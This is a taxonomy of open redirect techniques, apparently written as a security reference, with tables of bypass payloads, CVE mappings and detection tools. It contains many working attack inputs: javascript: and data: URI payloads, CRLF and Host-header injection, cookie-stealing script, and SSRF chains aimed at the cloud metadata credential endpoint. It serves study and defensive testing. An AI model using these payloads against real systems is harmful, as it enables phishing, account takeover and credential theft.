# Open Redirect Mutation/Variation Taxonomy

---

## Classification Structure

Open redirect vulnerabilities occur when a web application accepts user-controlled input to determine a redirect destination without sufficient validation. While historically dismissed as low-severity, recent research demonstrates that **8.7% of the top 10K websites** contain open redirect vulnerabilities, with over **11.5% of those being escalatable to critical vulnerabilities** including XSS, CSRF, and information leakage. This taxonomy classifies the full mutation space of open redirect techniques.

The taxonomy is organized around three axes. **Axis 1 (Mutation Target)** defines *what structural component of the URL or redirect mechanism* is manipulated — this forms the primary structure of the document. **Axis 2 (Bypass Type)** describes *what validation mechanism is defeated* — this is the cross-cutting dimension explaining why each mutation works. **Axis 3 (Attack Scenario)** identifies *where the redirect is weaponized* — this maps techniques to real-world impact chains.

### Axis 2: Bypass Type Summary

| Bypass Type | Description |
|------------|-------------|
| **Allowlist Bypass** | Trusted domain/pattern check defeated through structural manipulation |
| **Blocklist Bypass** | Blocked pattern (e.g., `//`, `http`) evasion through encoding or structural tricks |
| **Parser Differential** | Two URL parsers (validator vs. fetcher, server vs. browser) disagree on URL components |
| **Scheme Bypass** | Protocol restriction evaded, enabling `javascript:`, `data:`, or other dangerous schemes |
| **Normalization Mismatch** | Encoding/decoding asymmetry between validation and consumption layers |
| **TOCTOU** | Validation-time URL differs from use-time URL (DNS rebinding, redirect chains) |

### Foundational Mechanism

All open redirect mutations exploit a single fundamental gap: **the difference between what a URL validator considers "safe" and what a browser (or HTTP client) actually navigates to**. Every technique in this taxonomy either (a) makes a malicious URL appear safe to the validator, or (b) converts a validated-safe URL into a malicious destination after validation.

---

## §1. Scheme/Protocol Manipulation

Manipulation of the URL scheme component to bypass protocol-level validation or to inject executable code via pseudo-protocols.

### §1-1. Protocol-Relative URLs

When applications block URLs starting with `http://` or `https://`, omitting the scheme entirely causes the browser to inherit the current page's protocol, effectively creating a cross-domain redirect.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Double-slash relative** | Browser interprets `//` as scheme-relative authority | `//evil.com` | Filter checks for `http://` or `https://` literally |
| **Triple-slash relative** | Extra slashes consumed by browser normalization | `///evil.com` | Filter counts slashes but doesn't normalize |
| **Quad-slash variant** | Four or more slashes still resolve in some browsers | `////evil.com` | Browser normalizes redundant slashes |
| **Escaped-slash relative** | Backslash-forward-slash mix triggers browser normalization | `\/\/evil.com` | Browser normalizes `\` to `/`; server does not |
| **Whitespace-prefixed** | Control characters before `//` bypass string-start checks | `%09//evil.com`, `%0A//evil.com`, `%0D//evil.com` | Filter does not strip leading whitespace/control chars |
| **Newline-split slashes** | CRLF characters between slashes evade regex patterns | `/%0A/evil.com` | Regex-based filter does not account for line breaks |

### §1-2. Schemeless URL Colon Notation

Some parsers accept a scheme followed by a domain without the `//` authority separator, creating URLs that bypass checks for `://`.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Colon-only scheme** | `https:domain.com` parsed as valid URL by some browsers | `https:evil.com` | Filter blocks `://` but not `:` alone |
| **HTTP colon variant** | Same as above for HTTP | `http:evil.com` | Filter requires `://` pattern |

### §1-3. JavaScript Pseudo-Protocol

When redirect values are inserted into DOM sinks (e.g., `location.href`, `window.open()`), the `javascript:` pseudo-protocol escalates the redirect to arbitrary JavaScript execution (DOM-based XSS).

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Basic javascript:** | Direct protocol injection | `javascript:alert(1)` | No scheme validation |
| **Case variation** | Mixed-case evades case-sensitive filters | `JavaScript:alert(1)`, `JAVASCRIPT:alert(1)` | Case-sensitive blocklist |
| **Tab injection** | Tab characters (`%09`) inside scheme name | `j%09avascri%09pt:alert(1)` | Filter matches exact string `javascript:` |
| **Newline injection** | CRLF within scheme name | `jav%0Aascri%0Dpt:alert(1)` | Filter uses single-line regex |
| **CRLF-split scheme** | Full CRLF pair breaks scheme across lines | `java%0d%0ascript%0d%0a:alert(0)` | Regex-based blocklist |
| **Whitespace injection** | Spaces within scheme | `ja%20vascri%20pt:alert(1)` | Browsers strip embedded whitespace in scheme |
| **Backslash-encoded** | Escaped characters within scheme | `\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)` | Filter expects exact token match |
| **Leading control char** | Non-printable char before scheme | `%19javascript:alert(1)` | Filter checks from position 0 for `javascript` |
| **Comment embedding** | URL-safe characters to disrupt pattern matching | `javascript://https://trusted.com%0Aalert(1)` | Allowlist checks for `https://trusted.com` in URL |
| **Double URL-encoded** | Nested encoding evades single-decode filters | `javascript://%250Aalert(1)` | Server decodes once, browser decodes again |

### §1-4. Data URI Scheme

The `data:` URI scheme can encode redirect targets or JavaScript payloads inline.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Data text/html** | Inline HTML with redirect | `data:text/html,<script>location='https://evil.com'</script>` | No scheme restriction |
| **Base64-encoded data** | Payload hidden in base64 | `data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=` | Filter cannot decode base64 |

---

## §2. Authority/Host Component Manipulation

Manipulation of the URL authority section (userinfo, host, port) to make a malicious domain appear to match a trusted one during validation.

### §2-1. Userinfo/@ Symbol Abuse

RFC 3986 defines the `userinfo@host` syntax. If a validator extracts the hostname before the `@`, while the browser navigates to the hostname after the `@`, the redirect targets diverge.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Basic @ bypass** | Trusted domain placed in userinfo field | `https://trusted.com@evil.com` | Validator checks string-contains `trusted.com` |
| **Backslash-@ confusion** | Backslash before `@` confuses parser boundary | `https://trusted.com\@evil.com` | Parser treats `\` as path separator, not userinfo delimiter |
| **URL-encoded @** | Encoded `@` symbol evades pattern matching | `https://trusted.com%40evil.com` | Filter blocks literal `@` but not `%40` |
| **Square-bracket confusion** | `[` in userinfo causes parser disagreement | `https://trusted.com[@evil.com` | Spring UriComponentsBuilder returns different hostname than browser |
| **Credentials-style** | username:password format with redirect target as host | `https://user:pass@evil.com` | No userinfo validation |

### §2-2. Domain Suffix/Prefix Confusion

Flawed validation logic that checks if the URL "contains" or "starts/ends with" a trusted domain, allowing attackers to embed the trusted pattern in a malicious domain.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Subdomain wrapping** | Trusted domain as subdomain of attacker's domain | `https://trusted.com.evil.com` | Validator uses `endsWith("trusted.com")` but result includes `.evil.com` |
| **Suffix collision** | Attacker domain ends with trusted string | `https://notTRUSTED.com` | Validator uses `endsWith("trusted.com")` |
| **Path-as-domain** | Trusted domain appears in path, not host | `https://evil.com/trusted.com` | Validator uses `contains("trusted.com")` |
| **Query-as-domain** | Trusted domain in query string | `https://evil.com?trusted.com` | Validator uses `contains("trusted.com")` |
| **Fragment-as-domain** | Trusted domain in fragment (ignored by server) | `https://evil.com#trusted.com` | Validator uses `indexOf("trusted.com") > -1` |
| **TLD extension** | Append characters to trusted TLD | `https://trusted.comevil.com` | Validator checks prefix `trusted.com` without boundary |

### §2-3. IP Address Obfuscation

Representing the target IP address in non-standard notation to bypass domain-based filters.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Decimal notation** | Full 32-bit integer IP representation | `http://2130706433` (= 127.0.0.1) | Filter only blocks dotted-quad IPs |
| **Hexadecimal notation** | Hex-encoded IP | `http://0x7f000001` | Filter does not recognize hex IPs |
| **Octal notation** | Octal-encoded octets | `http://017700000001` | Filter does not normalize octal |
| **Mixed notation** | Each octet uses a different base | `http://0xA9.254.0251.0376` | No consistent IP normalization |
| **Partial decimal (Class B)** | Merged octets as single decimal | `http://169.254.43518` | Parser accepts partial decimal |
| **Partial decimal (Class A)** | Three octets merged into one value | `http://169.16689662` | Parser accepts collapsed format |
| **IPv6 embedding** | IPv4-mapped IPv6 address | `http://[::ffff:127.0.0.1]` | Filter only checks IPv4 patterns |
| **IPv6 loopback** | IPv6 shorthand for loopback | `http://[::1]` | Filter blocks `127.0.0.1` but not `[::1]` |
| **Enclosed alphanumerics** | Circled/fullwidth Unicode digits for IP | IP segments encoded with Unicode number forms | Parser normalizes Unicode numbers to ASCII digits |

### §2-4. IDN/Homograph Confusion

Internationalized Domain Names (IDN) allow Unicode characters that are visually identical to ASCII, enabling domain spoofing via Punycode.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Cyrillic substitution** | Cyrillic 'а' (U+0430) replaces Latin 'a' | `https://аpple.com` → `xn--pple-43d.com` | Validator compares display form, not Punycode |
| **Mixed-script domain** | Combining scripts within one label | Latin + Cyrillic characters in same domain label | Browser does not enforce script-homogeneity checks |
| **Unicode dot variants** | Fullwidth period (U+FF0E) or ideographic period (U+3002) as domain separator | `https://evil%E3%80%82com` | Parser normalizes Unicode dots to ASCII dots |
| **Fullwidth character substitution** | Fullwidth ASCII forms in domain | Fullwidth letters resolved to ASCII by normalization | Two-stage normalization: validate before normalize |

---

## §3. Path and Slash Manipulation

Manipulation of path separators, traversal sequences, and path normalization differences between components.

### §3-1. Slash Count Variation

Browsers and servers handle varying numbers of leading slashes differently, creating parsing disagreements about whether a value is a relative path or an authority reference.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Single slash prefix** | Relative path interpreted differently across contexts | `/evil.com` | Some redirect implementations prepend current origin |
| **Double slash (authority)** | Two slashes signal scheme-relative authority | `//evil.com` | §1-1 — filter does not recognize `//` as external |
| **Backslash substitution** | Backslashes normalized to forward slashes by browsers | `\\evil.com` or `\/evil.com` | Server treats `\` as literal; browser normalizes |
| **Mixed slashes** | Combination of forward and backslashes | `/\evil.com` | Inconsistent normalization between layers |

### §3-2. Path Traversal in Redirects

When the redirect target is appended to a base URL, traversal sequences can escape the intended path scope.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Dot-dot-slash traversal** | `../` sequences escape path prefix | `/redirect/../../http://evil.com` | Server resolves `..` after validation |
| **URL-encoded traversal** | Encoded traversal evades pattern matching | `/redirect/%2e%2e/%2e%2e/http://evil.com` | Filter checks literal `../` only |
| **Double-encoded traversal** | Nested encoding bypasses single-decode filters | `/redirect/%252e%252e/evil.com` | Server decodes twice; filter decodes once |
| **Client-side path traversal** | JavaScript resolves path traversal client-side | `/invite/../../../../attacker-route` | Client-side routing resolves traversal after server validation (CVE-2025-4123) |

### §3-3. Path Parameter Injection

Semicolons, matrix parameters, or other path-segment delimiters can be used to inject redirect targets.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Semicolon delimiter** | Semicolons treated as path parameter separator in Java/Tomcat | `/redirect;url=evil.com` | Framework strips path params before routing |
| **Dot-segment injection** | Single dot preserves path while evading pattern filters | `/./redirect/evil.com` | Filter expects exact path match |

---

## §4. Query and Fragment Component Manipulation

Exploitation of query string parameters and URL fragment handling differences between server and client.

### §4-1. Parameter Pollution

When multiple instances of the same parameter are submitted, different frameworks select different values, allowing an attacker to pass validation with a safe value while the redirect uses the malicious one.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Duplicate parameter** | First vs. last parameter wins | `?next=trusted.com&next=evil.com` | Validator checks first; redirect uses last (or vice versa) |
| **Array-notation pollution** | Framework-specific array handling | `?next[]=trusted.com&next[]=evil.com` | Framework concatenates or selects one |
| **Different parameter names** | Secondary redirect param overrides primary | `?redirect=trusted.com&url=evil.com` | Application checks `redirect` but follows `url` |

### §4-2. Fragment Identifier Abuse

The fragment (`#`) component is never sent to the server but is processed client-side, creating a fundamental server/client parsing split.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Fragment smuggling** | Malicious URL hidden after `#` | `https://trusted.com#@evil.com` | Server ignores fragment; client-side JS reads it |
| **URL-encoded fragment** | `%23` decoded to `#` after server-side validation | `https://trusted.com%23.evil.com` | Server validates full string as hostname; browser splits at `#` |
| **Fragment as parser confusion** | Fragment component disrupts host extraction | `//127.0.0.1#.evil.com:1389/path` | Validator extracts host as `127.0.0.1`; fetcher uses full string |
| **OAuth fragment leakage** | Access tokens in fragments survive cross-domain redirects | Open redirect in OAuth flow → token leaks to attacker via fragment | Implicit grant flow with `response_type=token` |

### §4-3. Query String Confusion

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Query-in-host** | `?` interpreted as query start, truncating validation | `https://evil.com?trusted.com` | Validator sees `trusted.com` in URL; browser navigates to `evil.com` |
| **Encoded query delimiter** | `%3F` decoded after validation | `https://evil.com%3Ftrusted.com` | Single-decode validation, double-decode consumption |

---

## §5. Character Encoding and Normalization Exploits

Manipulation of character encoding to disguise malicious URLs or break validation patterns. These techniques are **cross-cutting** — they apply to any URL component (scheme, host, path, etc.) described in §1–§4.

### §5-1. URL Encoding Tricks

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Single URL encoding** | Standard percent-encoding of critical characters | `%2F%2Fevil.com` (= `//evil.com`) | Filter checks decoded form but value is consumed encoded |
| **Double URL encoding** | Nested encoding survives one decode pass | `%252F%252Fevil.com` | Server decodes once for validation; second decode at redirect |
| **Triple URL encoding** | Three layers for deep decode chains | `%25252F%25252Fevil.com` | Multiple decode passes in proxy → app → redirect chain |
| **Selective encoding** | Only critical characters encoded | `https://evil%2Ecom` | Filter doesn't match `evil.com` but browser resolves the dot |
| **Over-encoding** | Encoding characters that don't need encoding | `%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D` | Pattern-matching filter works on decoded input only |

### §5-2. Null Byte and Control Character Injection

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Null byte truncation** | `%00` terminates string processing early | `https://trusted.com%00.evil.com` | C-based string handling truncates at null byte |
| **URL-encoded null** | `%00` in various URL positions | `//evil.com%00trusted.com` | Validator reads past null; redirect truncates |
| **Tab character injection** | `%09` breaks regex token matching | `%09//evil.com` | Leading whitespace ignored by browser; blocks regex match |
| **Carriage return injection** | `%0D` disrupts line-based parsing | `%0D//evil.com` | Filter expects single-line input |
| **Line feed injection** | `%0A` creates multi-line URL | `%0A//evil.com` | Regex `^` anchor fails across lines |
| **Form feed / vertical tab** | Exotic whitespace characters | `%0B//evil.com`, `%0C//evil.com` | Browser ignores; filter does not strip |

### §5-3. Unicode and Normalization Exploits

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Fullwidth character substitution** | Fullwidth ASCII forms (U+FF01–U+FF5E) | Fullwidth `/` (U+FF0F) instead of `/` | Normalization converts fullwidth → ASCII after validation |
| **Unicode dot confusion** | Ideographic full stop (U+3002) as domain separator | `evil%E3%80%82com` → `evil.com` | WHATWG URL parser normalizes U+3002 to `.` |
| **Circled letter encoding** | Circled Latin characters encode IP/domain | Circled digits for IP octets | Parser normalizes circled forms to plain digits |
| **Unicode normalization (NFKC)** | Compatibility decomposition changes character identity | `evil.c℀.trusted.com` (℀ → a/c) | Normalization applied after allowlist check |
| **Right-to-left override** | RTL Unicode characters reverse display order | RTL override character in URL | Display shows trusted domain; actual URL is different |

---

## §6. Redirect Mechanism Manipulation

Exploitation of the specific technical mechanism used to perform the redirect, rather than the URL content itself.

### §6-1. Server-Side Redirect via HTTP Headers

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Location header injection** | User input placed directly in `Location:` response header | `Location: https://evil.com` | No validation before header construction |
| **CRLF injection → Location** | Injecting `\r\n` to add a new `Location` header | `param=value%0D%0ALocation:%20https://evil.com` | Input reflected in headers without CRLF stripping |
| **3xx status code manipulation** | Different redirect codes (301/302/303/307/308) have different security semantics | 307/308 preserve request method and body | Application assumes redirect drops POST body |
| **Multiple Location headers** | Two `Location` headers with different values | Response contains two `Location:` headers | Browser follows first; validator checks second (or vice versa) |

### §6-2. HTML Meta Refresh Redirect

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Meta refresh injection** | `<meta http-equiv="refresh" content="0;url=evil.com">` in response body | Attacker controls meta tag content | Server does not set `Location` header; redirect is HTML-level |
| **Delayed meta refresh** | Timeout creates gap for user interaction spoofing | `content="5;url=evil.com"` | No user-visible redirect indication during delay |

### §6-3. JavaScript-Based Redirect (Client-Side)

Client-side redirects are the fastest-growing category. NDSS 2025 research found 20.8K instances across the top 10K websites.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **location.href assignment** | Direct property assignment from user input | `window.location.href = userInput` | No server-side validation; input from URL params/hash |
| **location.replace()** | Replace current history entry | `location.replace(userInput)` | Same as above; removes back-button escape |
| **location.assign()** | Explicit navigation | `location.assign(userInput)` | DOM sink with attacker-controlled input |
| **window.open()** | Opens new window/tab with attacker URL | `window.open(userInput)` | Escalatable to XSS via `javascript:` scheme |
| **document.location** | Alternative DOM property | `document.location = userInput` | Equivalent to `location.href` assignment |
| **jQuery/framework redirect** | Framework helper performs redirect | `$.redirect(userInput)` or router navigation | Framework does not validate redirect target |
| **postMessage-triggered redirect** | Cross-origin message causes navigation | `window.addEventListener('message', (e) => location = e.data)` | No origin validation on incoming message |

### §6-4. SVG/Media-Based Redirect

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **SVG onload redirect** | SVG event handler triggers navigation | `<svg onload="window.location='https://evil.com'">` | SVG upload allowed; CSP permits inline scripts |
| **SVG foreignObject** | Embedded HTML within SVG | `<foreignObject><body onload="location='...'">` | SVG rendered in browser context |

---

## §7. HTTP Header-Based Redirect Manipulation

Exploitation of HTTP request headers that influence redirect behavior on the server side.

### §7-1. Host Header Injection

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Direct Host override** | Malicious `Host:` header causes server to generate redirect to attacker domain | `Host: evil.com` | Server uses `Host` header to construct redirect URLs |
| **X-Forwarded-Host injection** | Override via proxy header when `Host` is validated | `X-Forwarded-Host: evil.com` | Framework trusts `X-Forwarded-Host` over `Host` |
| **X-Forwarded-Scheme downgrade** | Force HTTP → causes redirect to HTTPS with attacker host | `X-Forwarded-Scheme: http` + `X-Forwarded-Host: evil.com` | HTTPS redirect logic uses forwarded headers |
| **Absolute URL in request line** | Proxy-style `GET http://evil.com/ HTTP/1.1` | Full URL in request line overrides Host routing | Server prioritizes request-line URL over Host header |

### §7-2. Referer-Based Redirect

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Referer-driven redirect** | Application redirects to `Referer` header value after action | `Referer: https://evil.com` | Login/logout flow redirects to referring page |
| **Referer parameter extraction** | Server parses query params from Referer URL | `Referer: https://app.com?next=evil.com` | Redirect target extracted from Referer's query string |

### §7-3. Cache Poisoning via Header Injection

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Cached redirect poisoning** | Poisoned `X-Forwarded-Host` creates cached redirect to attacker | `X-Forwarded-Host: evil.com` on cacheable endpoint | Cache key does not include `X-Forwarded-Host`; redirect response cached |
| **Cache key normalization gap** | Cache normalizes URL differently than origin | Path confusion between cache and origin server | CDN/cache treats path as static; origin generates redirect |

---

## §8. URL Parser Differential Exploitation

Exploitation of structural disagreements between different URL parsing implementations, where a "validator" parser and a "consumer" parser interpret the same URL differently.

### §8-1. RFC vs. WHATWG Specification Divergence

The two primary URL specifications — RFC 3986 and the WHATWG URL Living Standard — differ in critical ways that create exploitable parsing gaps.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Backslash handling divergence** | RFC treats `\` as path char; WHATWG normalizes to `/` | `https://trusted.com\@evil.com` | Server (RFC parser) sees `trusted.com\@evil.com` as host; browser (WHATWG) sees `evil.com` as host |
| **Userinfo support divergence** | WHATWG deprecates userinfo; some parsers still honor it | `https://user@host` | Validator strips userinfo; browser navigates with it |
| **Fragment handling divergence** | Server-side parsers include/exclude fragment differently | `//host#.evil.com` | §4-2 — different truncation points |

### §8-2. Library-Specific Parser Quirks

Testing across 16 URL parser implementations reveals significant behavioral differences.

| Subtype | Mechanism | Affected Parsers | Key Condition |
|---------|-----------|-----------------|---------------|
| **Scheme confusion** | Missing or malformed scheme handled differently | Python `urllib` vs. `urllib3`, PHP `parse_url` vs. cURL | Validator and fetcher use different libraries |
| **Slash confusion** | Irregular slash counts parsed as path vs. authority | Node.js `url` vs. `url-parse`, Go `net/url` vs. browser | Slash count determines relative vs. absolute interpretation |
| **Backslash confusion** | `\` treated as path separator vs. literal character | Java `URL` vs. `URI`, .NET `Uri` vs. Python `urllib` | Cross-language URL parsing in microservices |
| **Encoded data confusion** | Encoded characters decoded at different stages | All parsers differ on decode timing | Validation before or after decode changes semantics |
| **Scheme mixup** | URL of one scheme parsed by another scheme's rules | Generic parser applied to scheme-specific URL | No scheme-specific validation applied |
| **Spring UriComponentsBuilder** | `[` in userinfo causes hostname disagreement | Spring Framework vs. browser | Validation via Spring; navigation via browser |
| **Express.js malformed URL** | `encodeurl()` encoding creates unexpected evaluations | Express.js `res.redirect()` / `res.location()` | Allowlist bypass via encoding differential (CVE-2024-29041) |

### §8-3. Dual-Parser Architectures

The most dangerous pattern: one parser validates the URL, a different parser fetches it.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Validate-then-fetch split** | Validator checks URL safety; fetcher resolves differently | URL passes `urllib` validation but `requests` follows redirect to evil | Two different URL libraries in same application |
| **Proxy-origin split** | Reverse proxy validates; origin server redirects | Nginx validates path; backend generates redirect from unvalidated param | Trust boundary between proxy and application |
| **WAF-application split** | WAF pattern matching; application follows redirect | WAF checks for `evil.com` literally; app resolves encoded/obfuscated form | WAF normalization differs from app normalization |

---

## §9. Redirect Chain and Indirect Exploitation

Techniques that chain open redirects with other functionality to amplify impact or bypass defenses that block direct external redirects.

### §9-1. Multi-Hop Redirect Chains

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Same-domain chaining** | Chain multiple same-domain redirects to reach external target | `/redirect1?url=/redirect2?url=evil.com` | Each hop validates "same domain" but final hop exits |
| **Cross-domain chain** | Redirect through multiple trusted domains | `trusted-a.com/redir→trusted-b.com/redir→evil.com` | Each domain only validates previous hop |
| **Redirect loop as SSRF** | Recursive redirect chains exhaust server resources or bypass filters | Internal redirect loop that eventually resolves externally | Server follows redirects server-side without loop detection |

### §9-2. OAuth/SSO Token Theft

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **redirect_uri manipulation** | Open redirect on OAuth client abused as redirect_uri | `/authorize?redirect_uri=https://app.com/callback/../open-redirect?url=evil.com` | IdP allows path traversal in redirect_uri; app has open redirect |
| **Implicit grant token leak** | Access token in fragment survives cross-domain redirect | Open redirect after OAuth callback → token sent to attacker | `response_type=token` with post-callback redirect |
| **Authorization code interception** | Auth code sent to open redirect endpoint | Modified redirect_uri points to open redirect path | IdP validates redirect_uri prefix only |
| **State parameter relay** | OAuth state preserved across redirect chain | Redirect chain maintains state param through to attacker server | State validation occurs before redirect chain completes |

### §9-3. SSRF via Open Redirect

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **SSRF filter bypass** | Server-side URL fetch follows redirect to internal resource | Fetch `https://app.com/redirect?url=http://169.254.169.254/` | SSRF filter validates initial URL (trusted domain); redirect points internally |
| **Cloud metadata access** | Redirect to cloud instance metadata endpoint | Chain to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Internal redirect from trusted domain to metadata IP |
| **Internal API access** | Redirect to internal service | Open redirect → `http://localhost:8080/admin` | Application follows redirects without re-validating |

### §9-4. XSS and CSRF Escalation

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **DOM XSS via javascript: scheme** | Client-side redirect to `javascript:` URL | `location.href = "javascript:alert(document.cookie)"` | §1-3 — DOM sink accepts pseudo-protocol |
| **SameSite cookie bypass** | JavaScript redirect triggers top-level navigation | Open redirect creates top-level request bypassing SameSite=Lax | Redirect occurs as top-level navigation, not cross-site embed |
| **Reflected XSS amplification** | Open redirect cached → reflected becomes stored | Cache poisoning + open redirect → persistent phishing | §7-3 — cached redirect serves malicious content |
| **CSRF via GET redirect** | Open redirect forces authenticated GET with side effects | `/redirect?url=https://app.com/delete-account` | Application performs state-changing action on GET |

### §9-5. Phishing and Social Engineering

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Trusted-domain phishing** | Legitimate domain in URL bar during redirect | `https://bank.com/redirect?url=evil-bank.com` | URL shows `bank.com` in link preview / email filter |
| **SEG bypass** | Email security gateway trusts redirect origin domain | Open redirect on Indeed/Google used to bypass Secure Email Gateways | SEG validates domain reputation of initial URL only |
| **QR code phishing** | QR code encodes legitimate URL with open redirect | QR → `https://trusted.com/r?u=evil.com` | No URL preview in QR scanning |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Impact |
|----------|-------------|---------------------------|--------|
| **Phishing** | Any web application with redirect functionality | §2-2, §5-1, §9-5 | Credential theft, malware delivery |
| **OAuth Token Theft** | OAuth/OIDC implicit or auth code flow | §3-2, §4-2, §9-2 | Account takeover |
| **SSRF Chaining** | Server-side URL fetch with redirect following | §2-3, §9-3 | Cloud metadata leak, internal network access |
| **DOM XSS Escalation** | Client-side JS redirect from user input | §1-3, §6-3, §9-4 | Arbitrary JS execution, session hijacking |
| **Cache Poisoning** | CDN/reverse proxy caching redirect responses | §7-1, §7-3 | Persistent redirect to attacker for all users |
| **CSRF Bypass** | SameSite=Lax cookies with GET-based actions | §6-3, §9-4 | Unauthorized state changes |
| **WAF/Filter Bypass** | WAF inspecting redirect parameters | §5-1, §5-2, §5-3, §8-3 | Downstream vulnerability exploitation |
| **Email Security Bypass** | Email gateways checking link reputation | §9-5 | Mass phishing delivery |
| **Account Takeover Chain** | Multi-step: redirect → XSS → session theft | §3-2, §6-3, §9-2, §9-4 | Full account compromise (CVE-2025-4123 pattern) |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §8-2 (Express.js encoding differential) + §2-1 | CVE-2024-29041 (Express.js < 4.19.2) | Allowlist bypass via `encodeurl()` behavior. CVSS 6.1 |
| §3-2 (Client-side path traversal) + §6-3 + §9-3 | CVE-2025-4123 (Grafana < 12.0.0) | Open redirect → Stored XSS → Full-read SSRF → Account takeover. CVSS 8.2 |
| §7-1 (Host header injection) + §7-3 | CVE-2021-29479 (Ratpack) | Cached redirect poisoning via `X-Forwarded-Host`. Persistent redirect |
| §7-1 (Host header injection) | CVE-2025-50578 (Heimdall Application) | Open redirect via Host header injection |
| §8-2 (RFC vs WHATWG) + §2-1 | mod_auth_openidc open redirect | `apr_uri_parse()` (RFC) vs browser (WHATWG) parsing differential |
| §6-3 (JS redirect) + §9-5 | Tumblr logout redirect (Nov 2024) | Unvalidated `redirect_to` parameter on logout endpoint |
| §2-2 (Domain suffix) + §9-2 | HackerOne #405100 (OAuth token theft) | `redirect_uri` manipulation on OAuth provider |
| §3-1 (Backslash) + §8-2 | Go-chi GHSA-vrw8 (RedirectSlashes) | Host header injection via backslash normalization |
| §2-2 + §9-5 | Indeed → Microsoft 365 phishing (2024) | Open redirect on Indeed.com used to bypass email filters and target Microsoft 365 credentials |
| §8-2 (16 parser differentials) | Flask-security, Flask-User, Flask-unchained, Video.js, Nagios XI, Clearance | Multiple open redirects via URL parsing confusion across 8 libraries |
| §6-3 + §9-4 (DOM-based) | NDSS 2025 study: 20.8K instances | 8.7% of top 10K sites affected; ~9% escalatable to DOM XSS |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **OpenRedireX** (Fuzzer) | HTTP parameter fuzzing for open redirects | Sends crafted redirect payloads and analyzes response `Location` headers and status codes |
| **Oralyzer** (Analyzer) | Open redirect detection via URL fuzzing | Python-based fuzzer that probes redirect parameters with payload lists |
| **OpenRedirect Fuzzer** (Fuzzer) | HTTP parameter-level redirect testing | Compares original domain with post-redirect domain to detect external redirects |
| **redirectplz** (Scanner) | Bulk URL open redirect scanning | Go-based multi-URL fuzzer with concurrent scanning |
| **Open Redirect Hunter** (Burp Extension) | Passive/active redirect detection during proxying | Burp Suite extension; automatically detects open redirects during browsing |
| **STORK** (Research Framework) | Large-scale static-dynamic open redirect analysis | Extracts 184 vulnerability indicators from JavaScript; combines static analysis with dynamic validation |
| **PortSwigger URL Cheat Sheet** (Reference) | URL validation bypass payload generation | Interactive web app generating context-specific bypass payloads for SSRF/CORS/Redirect |
| **PayloadsAllTheThings** (Payload Repo) | Open redirect payload collection | Curated payload lists organized by bypass technique category |
| **payloadbox/open-redirect-payload-list** (Payload Repo) | Comprehensive payload database | Community-maintained open redirect payload collection |
| **Burp Suite Scanner** (Commercial) | Automated vulnerability scanning | Detects server-side and DOM-based open redirects during active/passive scanning |
| **Nuclei** (Scanner) | Template-based vulnerability scanning | Community templates for common open redirect patterns |

---

## Summary: Core Principles

Open redirects exist because of a **fundamental architectural gap**: web applications must programmatically construct navigation targets from user input, yet the URL specification is complex enough that no single validation approach reliably distinguishes "safe internal redirect" from "attacker-controlled external redirect." The URL standard itself is fractured — RFC 3986, RFC 3987, and the WHATWG URL Living Standard each define subtly different parsing rules — and every browser, library, framework, and proxy implements its own interpretation. This creates a combinatorial explosion of parser differentials that attackers systematically exploit.

